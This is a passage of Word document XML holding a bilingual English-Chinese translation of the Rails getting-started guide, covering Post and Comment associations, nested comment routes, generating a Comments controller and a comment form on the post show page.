              </w:rPr>
              <w:t>  validates :title, :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true,</w:t>
            </w:r>
            <w:r w:rsidR="00692ED5">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:length</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 5</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39A569A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19D2E70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has_many :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AF5328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176C649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These two declarations enable a good bit of automatic behavior. For example, if you have an instance variable </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> containing a post, you can retrieve all the comments belonging to that post as an array using </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@post.comments</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 这两个声明启用了一个很好的自动关联功能。例如 如果你有一个包含一 post 的实例变量 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@post.comments</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 以数组的形式取回属于这一 post 的所有评论。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="345CB4A7"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更多关于Active Record associations的信息查看 </w:t>
      </w:r>
      <w:hyperlink r:id="rId91" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Active Record Associations</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> guide 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638B276F"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10.3 给Comments添加路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C74B31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作为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>welcome</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> controller，我们将还需要添加一个路由让 Rails 知道我们导航到哪里可以看到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>comments</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。再次打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件，你将会看到 scaffold 创建器在顶部为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 自动添加的入口，</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources :posts</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，把它改成如下：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2976"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="113EDB8D" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5406D35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resources :posts</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24E7938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resources :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6313FF8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33796D37"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这里把 creates </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>comments</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为一个嵌套资源放在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中。这正是 posts 和comments 的分层关系的表现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545FAB4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关于 routing 的更多的信息，查看 </w:t>
      </w:r>
      <w:hyperlink r:id="rId92" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails Routing from the Outside In</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> guide。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753A8387"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10.4 构造一个 Controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D4CFD9"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Model 已经到手了，你可以把你的注意力放到创建一个匹配的 controller 上了。类似的，像这样构造：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4536"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="4B5CC6B5" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F3690C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rails generate controller Comments</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="413FF23C"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这里新建了6个文件和一个空目录：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
        <w:gridCol w:w="3146"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5FF7FE5C" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D3CB187" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">File/Directory </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C7357B1" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">Purpose </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="2EB6BC06" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47E6003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app/controllers/comments_controller.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DA2197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The Comments controller </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5D481567" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3357FFF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app/views/comments/ </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5203224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Views of the controller are stored here </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="76C8ADB2" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3169EF0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test/functional/comments_controller_test.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4804AF5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The functional tests for the controller </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="78DF061E" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0BBC6BD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app/helpers/comments_helper.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5682F43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 view helper file </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="657D1ADD" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EFA929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test/unit/helpers/comments_helper_test.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0DD5FDF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The unit tests for the helper </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="4D71A090" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B7C6F3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app/assets/javascripts/comment.js.coffee </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FC3968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CoffeeScript for the controller </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5A637A44" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B299C0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app/assets/stylesheets/comment.css.scss </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="265307E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xml:space="preserve">Cascading style sheet for the controller </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="35566FE0"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就像大多数 blog，我们的读者将会直接发表他们的评论在他们阅读 post 的时候，并且一旦他们添加评论成功，将会回到 postshow 页面去查看他们刚刚列出的评论。正因为这样(的考虑)，我们的 CommentsController如下，它提供一个方法来创建 comments 和删除垃圾评论。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500EB0C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因此首先，我们来到 Post show template(</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/app/views/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)，创建一个新的 comment：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6576"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="15BB728A" w14:textId="77777777" w:rsidTr="00634195">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5EA18CC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w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="notice"&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>notice %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76A376A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780AD66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52CF23A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&lt;b&gt;Name:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F96899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@post.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D2A39B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57F591C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02E646D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5738DE9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&lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BBFB54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@post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44992EC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43A4F3B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2A26A8B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2824652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&lt;b&gt;Content:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1748703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@post.content %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5106B86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09DD95B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14C4A9A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&lt;h2&gt;Add a comment:&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57AE2DC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form_for([@post, @post.comments.build]) do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="501F4CF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5BD95F0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f.label :commenter</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3D1E5BB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f.text_field :commenter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50B157B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3E7EF85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280950C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f.label :body</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086BFCB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f.text_area :body</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31C9E07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28B486E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class="actions"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30A9023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f.submit %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EC618A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70AD568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44DD3CE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76773FD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'Edit Post', edit_post_path(@post) %&gt;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57D8081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'Back to Posts', posts_path %&gt;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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5325C83C"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This adds a form on the </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> show page that creates a new comment by calling the </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CommentsController</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action. Let’s wire that up: 这里添加一个forms在Post show页面用来创建一个新的评论，它将会调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CommentsController</w:t>
      </w:r>
